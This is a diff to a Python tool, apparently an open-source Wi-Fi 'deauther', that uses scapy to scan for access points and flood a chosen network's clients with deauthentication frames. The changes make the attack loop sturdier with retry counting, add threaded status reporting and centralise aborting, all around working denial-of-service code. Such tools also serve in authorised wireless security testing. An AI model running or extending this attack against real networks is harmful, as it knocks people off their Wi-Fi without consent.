@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 
-import sys
+import sys  # leave it
 import signal
 import logging
 import argparse
+import threading  # leave it
 
 from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, \
     Dot11QoS, Dot11Deauth, Dot11
@@ -35,6 +36,8 @@ conf.verb = 0
 
 class Interceptor:
     _ABORT = False
+    _ABORT_LCK = threading.Lock()
+    _PRINT_STATS_INVT = 1
 
     def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
                  ssid_name, bssid_addr, custom_client_macs, custom_channels, autostart):
@@ -42,7 +45,7 @@ class Interceptor:
         self._channel_sniff_timeout = 2
         self._scan_intv = 0.1
         self._deauth_intv = 0.1
-        self._printf_res_intv = 1
+        self._max_consecutive_failed_send_cnt = 5 / self._deauth_intv  # if fails to send for 5 seconds consecutively
         self._ssid_str_pad = 42  # total len 80
 
         self._current_channel_num = None
@@ -242,9 +245,7 @@ class Interceptor:
                 pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                 printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
         if not target_map:
-            print_error("Not APs were found, quitting...")
-            Interceptor._ABORT = True
-            exit(0)
+            Interceptor.abort_run("Not APs were found, quitting...")
 
         printf(DELIM)
 
@@ -314,18 +315,23 @@ class Interceptor:
         try:
             print_info(f"Starting de-auth loop...")
 
+            failed_attempts_ctr = 0
             ap_mac = self.target_ssid.mac_addr
             while not Interceptor._ABORT:
-                self.attack_loop_count += 1
-                for client_mac in self._get_target_clients():
-                    self._send_deauth_client(ap_mac, client_mac)
-                if not self._custom_target_client_mac:
-                    self._send_deauth_broadcast(ap_mac)
+                try:
+                    self.attack_loop_count += 1
+                    for client_mac in self._get_target_clients():
+                        self._send_deauth_client(ap_mac, client_mac)
+                    if not self._custom_target_client_mac:
+                        self._send_deauth_broadcast(ap_mac)
+                    failed_attempts_ctr = 0  # reset counter
+                except Exception as exc:
+                    failed_attempts_ctr += 1
+                    if failed_attempts_ctr >= self._max_consecutive_failed_send_cnt:  # todo place exception in send to test this
+                        raise exc
             sleep(self._deauth_intv)
         except Exception as exc:
-            print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
-            Interceptor._ABORT = True
-            exit(0)
+            Interceptor.abort_run(f"Exception in deauth-loop -> {traceback.format_exc()}")
 
     def _send_deauth_client(self, ap_mac: str, client_mac: str):
         sendp(RadioTap() /
@@ -351,36 +357,53 @@ class Interceptor:
         self._set_channel(ssid_ch)
 
         printf(f"{DELIM}\n")
-        for action in [self._run_deauther, self._listen_for_clients]:
-            t = Thread(target=action, args=tuple(), daemon=True)
-            t.start()
 
+        threads = list()
+        for action in [self._run_deauther, self._listen_for_clients, self.report_status]:
+            t = Thread(target=action, args=tuple())
+            t.start()
+            threads.append(t)
+
+        for t in threads:
+            t.join()
+
+        # TODO - I remove daemon
         # TODO print info stats into thread as well
         # TODO start all 3 threads and join them
         # TODO when printing exception somewhere and setting abort as false, put a small sleep (u can wrap it) so that exception prints well
         # TODO debug prints
+        # TODO test - raise exc and see output
+        # TODO test - start and finish entire run
+        # TODO update version
 
+    def report_status(self):
         start = get_time()
         printf(f"{DELIM}\n")
 
         while not Interceptor._ABORT:
             buffer_sz = self._print_midrun_output()
             print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
-            print_info(f"Channel{str(ssid_ch).rjust(80 - 11, ' ')}")
+            print_info(f"Channel{str(self._current_channel_num).rjust(80 - 11, ' ')}")
             print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
             print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
             print_info(f"Target clients{BOLD}{str(len(self._get_target_clients())).rjust(80 - 18, ' ')}{RESET}")
             print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
-            sleep(self._printf_res_intv)
+            sleep(Interceptor._PRINT_STATS_INVT)
             clear_line(7 + buffer_sz)
 
     @staticmethod
-    def user_abort(*args):
-        if not Interceptor._ABORT:
-            Interceptor._ABORT = True
-            printf(f"{DELIM}")
-            print_error(f"User asked to stop, quitting...")
-            exit(0)
+    def user_abort(*_):
+        Interceptor.abort_run(f"User asked to stop, quitting...")
+
+    @staticmethod
+    def abort_run(msg: str):
+        with Interceptor._ABORT_LCK:
+            if not Interceptor._ABORT:
+                Interceptor._ABORT = True
+                sleep(Interceptor._PRINT_STATS_INVT * 1.1)  # let prints finish
+                printf(f"{DELIM}")
+                print_error(msg)
+                exit(0)
 
 
 def main():
